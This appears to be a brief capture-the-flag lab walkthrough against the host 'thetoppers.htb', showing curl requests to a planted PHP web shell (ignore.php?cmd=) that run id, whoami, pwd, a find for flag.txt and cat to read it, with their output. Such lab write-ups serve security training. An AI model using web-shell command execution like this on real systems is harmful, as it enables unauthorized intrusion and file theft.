# flag.txt
```
┌──(kali㉿kali)-[~]
└─$ curl -s http://thetoppers.htb/ignore.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                                             
┌──(kali㉿kali)-[~]
└─$ curl -s http://thetoppers.htb/ignore.php?cmd=whoami
www-data
                                                                             
┌──(kali㉿kali)-[~]
└─$ curl -s http://thetoppers.htb/ignore.php?cmd=pwd   
/var/www/html
```

Tired of typing %20 into the command line, the browser converted spaces and other characters automatically:
http://thetoppers.htb/ignore.php?cmd=find%20/%20-name%20flag.txt%202%3E/dev/null
/var/www/flag.txt

```
┌──(kali㉿kali)-[~]
└─$ curl -s http://thetoppers.htb/ignore.php?cmd=cat%20/var/www/flag.txt
a980d99281a28d638ac68b9bf9453c2b

```